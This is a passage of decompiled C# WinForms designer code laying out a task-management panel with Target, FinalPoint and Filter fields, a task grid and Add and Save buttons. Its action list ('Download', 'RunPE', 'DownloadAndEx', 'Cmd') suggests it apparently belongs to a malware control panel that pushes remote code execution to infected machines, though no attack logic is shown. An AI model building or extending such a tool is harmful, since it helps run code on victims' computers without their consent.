		((System.Windows.Forms.Control)this.editTaskAction).Size = new System.Drawing.Size(264, 23);
		((System.Windows.Forms.Control)this.editTaskAction).TabIndex = 90;
		((System.Windows.Forms.Control)this.editTaskAction).Text = "Download";
		((System.Windows.Forms.Control)this.newTaskAction).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.ComboBox)this.newTaskAction).FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		((System.Windows.Forms.Control)this.newTaskAction).Font = new System.Drawing.Font("Segoe UI", 9f);
		((System.Windows.Forms.Control)this.newTaskAction).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
		((System.Windows.Forms.ListControl)this.newTaskAction).FormattingEnabled = true;
		((System.Windows.Forms.ComboBox)this.newTaskAction).Items.AddRange(new object[5] { "Download", "RunPE", "DownloadAndEx", "OpenLink", "Cmd" });
		((System.Windows.Forms.Control)this.newTaskAction).Location = new System.Drawing.Point(199, 376);
		((System.Windows.Forms.Control)this.newTaskAction).Name = "newTaskAction";
		((System.Windows.Forms.Control)this.newTaskAction).Size = new System.Drawing.Size(268, 23);
		((System.Windows.Forms.Control)this.newTaskAction).TabIndex = 89;
		((System.Windows.Forms.Control)this.newTaskAction).Text = "Download";
		((AnimaTextBox)this.newTaskFilter).Dark = false;
		((System.Windows.Forms.Control)this.newTaskFilter).Location = new System.Drawing.Point(119, 502);
		((AnimaTextBox)this.newTaskFilter).MaxLength = 32767;
		((AnimaTextBox)this.newTaskFilter).MultiLine = false;
		((System.Windows.Forms.Control)this.newTaskFilter).Name = "newTaskFilter";
		((AnimaTextBox)this.newTaskFilter).Numeric = false;
		((AnimaTextBox)this.newTaskFilter).ReadOnly = false;
		((System.Windows.Forms.Control)this.newTaskFilter).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.newTaskFilter).TabIndex = 88;
		((AnimaTextBox)this.newTaskFilter).UseSystemPasswordChar = false;
		((AnimaTextBox)this.newTaskFinal).Dark = false;
		((System.Windows.Forms.Control)this.newTaskFinal).Location = new System.Drawing.Point(119, 459);
		((AnimaTextBox)this.newTaskFinal).MaxLength = 32767;
		((AnimaTextBox)this.newTaskFinal).MultiLine = false;
		((System.Windows.Forms.Control)this.newTaskFinal).Name = "newTaskFinal";
		((AnimaTextBox)this.newTaskFinal).Numeric = false;
		((AnimaTextBox)this.newTaskFinal).ReadOnly = false;
		((System.Windows.Forms.Control)this.newTaskFinal).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.newTaskFinal).TabIndex = 87;
		((AnimaTextBox)this.newTaskFinal).UseSystemPasswordChar = false;
		((AnimaTextBox)this.newTaskTarget).Dark = false;
		((System.Windows.Forms.Control)this.newTaskTarget).Location = new System.Drawing.Point(119, 417);
		((AnimaTextBox)this.newTaskTarget).MaxLength = 32767;
		((AnimaTextBox)this.newTaskTarget).MultiLine = false;
		((System.Windows.Forms.Control)this.newTaskTarget).Name = "newTaskTarget";
		((AnimaTextBox)this.newTaskTarget).Numeric = false;
		((AnimaTextBox)this.newTaskTarget).ReadOnly = false;
		((System.Windows.Forms.Control)this.newTaskTarget).Size = new System.Drawing.Size(438, 23);
		((System.Windows.Forms.Control)this.newTaskTarget).TabIndex = 86;
		((AnimaTextBox)this.newTaskTarget).UseSystemPasswordChar = false;
		((System.Windows.Forms.Control)this.currentTaskStatusLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Label)this.currentTaskStatusLbl).ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.currentTaskStatusLbl).Location = new System.Drawing.Point(633, 581);
		((System.Windows.Forms.Control)this.currentTaskStatusLbl).Name = "currentTaskStatusLbl";
		((System.Windows.Forms.Control)this.currentTaskStatusLbl).Size = new System.Drawing.Size(78, 25);
		((MetroSetLabel)this.currentTaskStatusLbl).Style = (Style)1;
		((MetroSetLabel)this.currentTaskStatusLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.currentTaskStatusLbl).TabIndex = 83;
		((System.Windows.Forms.Control)this.currentTaskStatusLbl).Text = "Status:";
		((System.Windows.Forms.Label)this.currentTaskStatusLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.currentTaskStatusLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.currentTaskStatusLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.editTaskVisible).BackColor = System.Drawing.Color.Transparent;
		((MetroSetCheckBox)this.editTaskVisible).BackgroundColor = System.Drawing.Color.FromArgb(30, 30, 30);
		((MetroSetCheckBox)this.editTaskVisible).BorderColor = System.Drawing.Color.FromArgb(155, 155, 155);
		((MetroSetCheckBox)this.editTaskVisible).Checked = true;
		((MetroSetCheckBox)this.editTaskVisible).CheckSignColor = System.Drawing.Color.FromArgb(65, 177, 225);
		((MetroSetCheckBox)this.editTaskVisible).CheckState = (CheckState)1;
		((System.Windows.Forms.Control)this.editTaskVisible).Cursor = System.Windows.Forms.Cursors.Hand;
		((MetroSetCheckBox)this.editTaskVisible).DisabledBorderColor = System.Drawing.Color.FromArgb(85, 85, 85);
		((System.Windows.Forms.Control)this.editTaskVisible).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.editTaskVisible).Location = new System.Drawing.Point(1041, 586);
		((System.Windows.Forms.Control)this.editTaskVisible).Name = "editTaskVisible";
		((MetroSetCheckBox)this.editTaskVisible).SignStyle = (SignStyle)0;
		((System.Windows.Forms.Control)this.editTaskVisible).Size = new System.Drawing.Size(19, 16);
		((MetroSetCheckBox)this.editTaskVisible).Style = (Style)1;
		((MetroSetCheckBox)this.editTaskVisible).StyleManager = null;
		((System.Windows.Forms.Control)this.editTaskVisible).TabIndex = 82;
		((MetroSetCheckBox)this.editTaskVisible).ThemeAuthor = "Narwin";
		((MetroSetCheckBox)this.editTaskVisible).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.editTaskVisibleLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.editTaskVisibleLbl).Location = new System.Drawing.Point(972, 581);
		((System.Windows.Forms.Control)this.editTaskVisibleLbl).Name = "editTaskVisibleLbl";
		((System.Windows.Forms.Control)this.editTaskVisibleLbl).Size = new System.Drawing.Size(63, 25);
		((MetroSetLabel)this.editTaskVisibleLbl).Style = (Style)1;
		((MetroSetLabel)this.editTaskVisibleLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.editTaskVisibleLbl).TabIndex = 81;
		((System.Windows.Forms.Control)this.editTaskVisibleLbl).Text = "Visible:";
		((System.Windows.Forms.Label)this.editTaskVisibleLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.editTaskVisibleLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.editTaskVisibleLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.editTaskFilterLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Label)this.editTaskFilterLbl).ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.editTaskFilterLbl).Location = new System.Drawing.Point(635, 501);
		((System.Windows.Forms.Control)this.editTaskFilterLbl).Name = "editTaskFilterLbl";
		((System.Windows.Forms.Control)this.editTaskFilterLbl).Size = new System.Drawing.Size(76, 25);
		((MetroSetLabel)this.editTaskFilterLbl).Style = (Style)1;
		((MetroSetLabel)this.editTaskFilterLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.editTaskFilterLbl).TabIndex = 77;
		((System.Windows.Forms.Control)this.editTaskFilterLbl).Text = "Filter:";
		((System.Windows.Forms.Label)this.editTaskFilterLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.editTaskFilterLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.editTaskFilterLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.newTaskFilterLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.newTaskFilterLbl).Location = new System.Drawing.Point(-1, 500);
		((System.Windows.Forms.Control)this.newTaskFilterLbl).Name = "newTaskFilterLbl";
		((System.Windows.Forms.Control)this.newTaskFilterLbl).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.newTaskFilterLbl).Style = (Style)1;
		((MetroSetLabel)this.newTaskFilterLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.newTaskFilterLbl).TabIndex = 75;
		((System.Windows.Forms.Control)this.newTaskFilterLbl).Text = "Filter:";
		((System.Windows.Forms.Label)this.newTaskFilterLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.newTaskFilterLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.newTaskFilterLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.editTaskFinalLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Label)this.editTaskFinalLbl).ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.editTaskFinalLbl).Location = new System.Drawing.Point(633, 457);
		((System.Windows.Forms.Control)this.editTaskFinalLbl).Name = "editTaskFinalLbl";
		((System.Windows.Forms.Control)this.editTaskFinalLbl).Size = new System.Drawing.Size(78, 25);
		((MetroSetLabel)this.editTaskFinalLbl).Style = (Style)1;
		((MetroSetLabel)this.editTaskFinalLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.editTaskFinalLbl).TabIndex = 73;
		((System.Windows.Forms.Control)this.editTaskFinalLbl).Text = "FinalPoint:";
		((System.Windows.Forms.Label)this.editTaskFinalLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.editTaskFinalLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.editTaskFinalLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.saveTaskBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.saveTaskBtn).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.saveTaskBtn).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		((System.Windows.Forms.Control)this.saveTaskBtn).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.saveTaskBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.saveTaskBtn).Location = new System.Drawing.Point(1069, 581);
		((System.Windows.Forms.Control)this.saveTaskBtn).Name = "saveTaskBtn";
		((System.Windows.Forms.Control)this.saveTaskBtn).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.saveTaskBtn).TabIndex = 72;
		((System.Windows.Forms.Control)this.saveTaskBtn).Text = "Save";
		((System.Windows.Forms.ButtonBase)this.saveTaskBtn).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.saveTaskBtn).Click += new System.EventHandler(saveTaskBtn_Click);
		((System.Windows.Forms.Control)this.editTaskTargetLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Label)this.editTaskTargetLbl).ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.editTaskTargetLbl).Location = new System.Drawing.Point(633, 415);
		((System.Windows.Forms.Control)this.editTaskTargetLbl).Name = "editTaskTargetLbl";
		((System.Windows.Forms.Control)this.editTaskTargetLbl).Size = new System.Drawing.Size(78, 25);
		((MetroSetLabel)this.editTaskTargetLbl).Style = (Style)1;
		((MetroSetLabel)this.editTaskTargetLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.editTaskTargetLbl).TabIndex = 69;
		((System.Windows.Forms.Control)this.editTaskTargetLbl).Text = "Target:";
		((System.Windows.Forms.Label)this.editTaskTargetLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.editTaskTargetLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.editTaskTargetLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.editTaskActionLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Label)this.editTaskActionLbl).ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		((System.Windows.Forms.Control)this.editTaskActionLbl).Location = new System.Drawing.Point(633, 375);
		((System.Windows.Forms.Control)this.editTaskActionLbl).Name = "editTaskActionLbl";
		((System.Windows.Forms.Control)this.editTaskActionLbl).Size = new System.Drawing.Size(78, 25);
		((MetroSetLabel)this.editTaskActionLbl).Style = (Style)1;
		((MetroSetLabel)this.editTaskActionLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.editTaskActionLbl).TabIndex = 68;
		((System.Windows.Forms.Control)this.editTaskActionLbl).Text = "Action:";
		((System.Windows.Forms.Label)this.editTaskActionLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.editTaskActionLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.editTaskActionLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.metroSetDivider9).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.metroSetDivider9).Location = new System.Drawing.Point(598, 329);
		((System.Windows.Forms.Control)this.metroSetDivider9).Name = "metroSetDivider9";
		((MetroSetDivider)this.metroSetDivider9).Orientation = (DividerStyle)1;
		((System.Windows.Forms.Control)this.metroSetDivider9).Size = new System.Drawing.Size(4, 294);
		((MetroSetDivider)this.metroSetDivider9).Style = (Style)1;
		((MetroSetDivider)this.metroSetDivider9).StyleManager = null;
		((System.Windows.Forms.Control)this.metroSetDivider9).TabIndex = 67;
		((System.Windows.Forms.Control)this.metroSetDivider9).Text = "metroSetDivider9";
		((MetroSetDivider)this.metroSetDivider9).ThemeAuthor = "Narwin";
		((MetroSetDivider)this.metroSetDivider9).ThemeName = "MetroDark";
		((MetroSetDivider)this.metroSetDivider9).Thickness = 1;
		((System.Windows.Forms.Control)this.newTaskFinalLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.newTaskFinalLbl).Location = new System.Drawing.Point(-1, 459);
		((System.Windows.Forms.Control)this.newTaskFinalLbl).Name = "newTaskFinalLbl";
		((System.Windows.Forms.Control)this.newTaskFinalLbl).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.newTaskFinalLbl).Style = (Style)1;
		((MetroSetLabel)this.newTaskFinalLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.newTaskFinalLbl).TabIndex = 65;
		((System.Windows.Forms.Control)this.newTaskFinalLbl).Text = "FinalPoint:";
		((System.Windows.Forms.Label)this.newTaskFinalLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.newTaskFinalLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.newTaskFinalLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.addTaskBtn).BackColor = System.Drawing.Color.FromArgb(35, 147, 195);
		((System.Windows.Forms.ButtonBase)this.addTaskBtn).FlatAppearance.BorderSize = 0;
		((System.Windows.Forms.ButtonBase)this.addTaskBtn).FlatStyle = System.Windows.Forms.FlatStyle.Popup;
		((System.Windows.Forms.Control)this.addTaskBtn).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.addTaskBtn).ForeColor = System.Drawing.Color.White;
		((System.Windows.Forms.Control)this.addTaskBtn).Location = new System.Drawing.Point(478, 581);
		((System.Windows.Forms.Control)this.addTaskBtn).Name = "addTaskBtn";
		((System.Windows.Forms.Control)this.addTaskBtn).Size = new System.Drawing.Size(79, 26);
		((System.Windows.Forms.Control)this.addTaskBtn).TabIndex = 64;
		((System.Windows.Forms.Control)this.addTaskBtn).Text = "Add";
		((System.Windows.Forms.ButtonBase)this.addTaskBtn).UseVisualStyleBackColor = false;
		((System.Windows.Forms.Control)this.addTaskBtn).Click += new System.EventHandler(addTaskBtn_Click);
		((System.Windows.Forms.Control)this.newTaskTargetLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.newTaskTargetLbl).Location = new System.Drawing.Point(-1, 415);
		((System.Windows.Forms.Control)this.newTaskTargetLbl).Name = "newTaskTargetLbl";
		((System.Windows.Forms.Control)this.newTaskTargetLbl).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.newTaskTargetLbl).Style = (Style)1;
		((MetroSetLabel)this.newTaskTargetLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.newTaskTargetLbl).TabIndex = 59;
		((System.Windows.Forms.Control)this.newTaskTargetLbl).Text = "Target:";
		((System.Windows.Forms.Label)this.newTaskTargetLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.newTaskTargetLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.newTaskTargetLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.Control)this.newTaskActionLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		((System.Windows.Forms.Control)this.newTaskActionLbl).Location = new System.Drawing.Point(-1, 374);
		((System.Windows.Forms.Control)this.newTaskActionLbl).Name = "newTaskActionLbl";
		((System.Windows.Forms.Control)this.newTaskActionLbl).Size = new System.Drawing.Size(114, 25);
		((MetroSetLabel)this.newTaskActionLbl).Style = (Style)1;
		((MetroSetLabel)this.newTaskActionLbl).StyleManager = null;
		((System.Windows.Forms.Control)this.newTaskActionLbl).TabIndex = 58;
		((System.Windows.Forms.Control)this.newTaskActionLbl).Text = "Action:";
		((System.Windows.Forms.Label)this.newTaskActionLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		((MetroSetLabel)this.newTaskActionLbl).ThemeAuthor = "Narwin";
		((MetroSetLabel)this.newTaskActionLbl).ThemeName = "MetroDark";
		((System.Windows.Forms.DataGridView)this.tasksDgv).AllowUserToAddRows = false;
		((System.Windows.Forms.DataGridView)this.tasksDgv).AllowUserToDeleteRows = false;
		((System.Windows.Forms.DataGridView)this.tasksDgv).AllowUserToResizeColumns = false;
		((System.Windows.Forms.DataGridView)this.tasksDgv).AllowUserToResizeRows = false;
		dataGridViewCellStyle16.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle16.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle16.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle16.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle16.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.tasksDgv).AlternatingRowsDefaultCellStyle = dataGridViewCellStyle16;
		((System.Windows.Forms.DataGridView)this.tasksDgv).AutoGenerateColumns = false;
		((System.Windows.Forms.DataGridView)this.tasksDgv).BackgroundColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.DataGridView)this.tasksDgv).BorderStyle = System.Windows.Forms.BorderStyle.None;
		((System.Windows.Forms.DataGridView)this.tasksDgv).CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.RaisedVertical;
		((System.Windows.Forms.DataGridView)this.tasksDgv).ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		((System.Windows.Forms.DataGridView)this.tasksDgv).ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle17.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle17.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle17.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle17.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle17.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle17.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle17.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.tasksDgv).ColumnHeadersDefaultCellStyle = dataGridViewCellStyle17;
		((System.Windows.Forms.DataGridView)this.tasksDgv).ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		((System.Windows.Forms.DataGridView)this.tasksDgv).Columns.AddRange((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1, (System.Windows.Forms.DataGridViewColumn)this.targetDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.actionDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.finalPointDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.currentDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.statusDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.filterDataGridViewTextBoxColumn, (System.Windows.Forms.DataGridViewColumn)this.visibleDataGridViewCheckBoxColumn);
		((System.Windows.Forms.DataGridView)this.tasksDgv).DataSource = this.object_11;
		dataGridViewCellStyle18.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle18.BackColor = System.Drawing.Color.FromArgb(58, 62, 73);
		dataGridViewCellStyle18.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle18.ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle18.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle18.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle18.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		((System.Windows.Forms.DataGridView)this.tasksDgv).DefaultCellStyle = dataGridViewCellStyle18;
		((System.Windows.Forms.DataGridView)this.tasksDgv).EditMode = System.Windows.Forms.DataGridViewEditMode.EditOnEnter;
		((System.Windows.Forms.DataGridView)this.tasksDgv).EnableHeadersVisualStyles = false;
		((System.Windows.Forms.DataGridView)this.tasksDgv).GridColor = System.Drawing.Color.FromArgb(52, 60, 67);
		((System.Windows.Forms.Control)this.tasksDgv).Location = new System.Drawing.Point(21, 13);
		((System.Windows.Forms.DataGridView)this.tasksDgv).MultiSelect = false;
		((System.Windows.Forms.Control)this.tasksDgv).Name = "tasksDgv";
		((System.Windows.Forms.DataGridView)this.tasksDgv).ReadOnly = true;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Sunken;
		dataGridViewCellStyle19.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle19.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		dataGridViewCellStyle19.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle19.ForeColor = System.Drawing.Color.Silver;
		dataGridViewCellStyle19.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle19.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle19.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowHeadersDefaultCellStyle = dataGridViewCellStyle19;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowHeadersWidthSizeMode = System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
		dataGridViewCellStyle20.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle20.BackColor = System.Drawing.Color.FromArgb(52, 60, 67);
		dataGridViewCellStyle20.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowsDefaultCellStyle = dataGridViewCellStyle20;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowTemplate.DefaultCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowTemplate.DefaultCellStyle.BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowTemplate.DefaultCellStyle.ForeColor = System.Drawing.Color.Silver;
		((System.Windows.Forms.DataGridView)this.tasksDgv).ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
		((System.Windows.Forms.DataGridView)this.tasksDgv).SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		((System.Windows.Forms.DataGridView)this.tasksDgv).ShowEditingIcon = false;
		((System.Windows.Forms.Control)this.tasksDgv).Size = new System.Drawing.Size(1126, 310);
		((System.Windows.Forms.Control)this.tasksDgv).TabIndex = 16;
		((System.Windows.Forms.DataGridView)this.tasksDgv).RowStateChanged += new System.Windows.Forms.DataGridViewRowStateChangedEventHandler(tasksDgv_RowStateChanged);
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).DataPropertyName = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).HeaderText = "ID";
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).Name = "iDDataGridViewTextBoxColumn1";
		((System.Windows.Forms.DataGridViewBand)this.iDDataGridViewTextBoxColumn1).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.iDDataGridViewTextBoxColumn1).Width = 50;
		((System.Windows.Forms.DataGridViewColumn)this.targetDataGridViewTextBoxColumn).DataPropertyName = "Target";
		((System.Windows.Forms.DataGridViewColumn)this.targetDataGridViewTextBoxColumn).HeaderText = "Target";
		((System.Windows.Forms.DataGridViewColumn)this.targetDataGridViewTextBoxColumn).Name = "targetDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.targetDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.targetDataGridViewTextBoxColumn).Width = 320;
		((System.Windows.Forms.DataGridViewColumn)this.actionDataGridViewTextBoxColumn).DataPropertyName = "Action";
		((System.Windows.Forms.DataGridViewColumn)this.actionDataGridViewTextBoxColumn).HeaderText = "Action";
		((System.Windows.Forms.DataGridViewColumn)this.actionDataGridViewTextBoxColumn).Name = "actionDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.actionDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.actionDataGridViewTextBoxColumn).Width = 150;
		((System.Windows.Forms.DataGridViewColumn)this.finalPointDataGridViewTextBoxColumn).DataPropertyName = "FinalPoint";
		((System.Windows.Forms.DataGridViewColumn)this.finalPointDataGridViewTextBoxColumn).HeaderText = "FinalPoint";
		((System.Windows.Forms.DataGridViewColumn)this.finalPointDataGridViewTextBoxColumn).Name = "finalPointDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.finalPointDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.finalPointDataGridViewTextBoxColumn).Width = 150;
		((System.Windows.Forms.DataGridViewColumn)this.currentDataGridViewTextBoxColumn).DataPropertyName = "Current";
		((System.Windows.Forms.DataGridViewColumn)this.currentDataGridViewTextBoxColumn).HeaderText = "Current";
		((System.Windows.Forms.DataGridViewColumn)this.currentDataGridViewTextBoxColumn).Name = "currentDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.currentDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.currentDataGridViewTextBoxColumn).Width = 200;
		((System.Windows.Forms.DataGridViewColumn)this.statusDataGridViewTextBoxColumn).DataPropertyName = "Status";
		((System.Windows.Forms.DataGridViewColumn)this.statusDataGridViewTextBoxColumn).HeaderText = "Status";
		((System.Windows.Forms.DataGridViewColumn)this.statusDataGridViewTextBoxColumn).Name = "statusDataGridViewTextBoxColumn";
		((System.Windows.Forms.DataGridViewBand)this.statusDataGridViewTextBoxColumn).ReadOnly = true;
		((System.Windows.Forms.DataGridViewColumn)this.statusDataGridViewTextBoxColumn).Width = 200;
		((System.Windows.Forms.DataGridViewColumn)this.filterDataGridViewTextBoxColumn).DataPropertyName = "Filter";
		((System.Windows.Forms.DataGridViewColumn)this.filterDataGridViewTextBoxColumn).HeaderText = "Filter";
		((System.Windows.Forms.DataGridViewColumn)this.filterDataGridViewTextBoxColumn).Name = "filterDataGridViewTextBoxColumn";
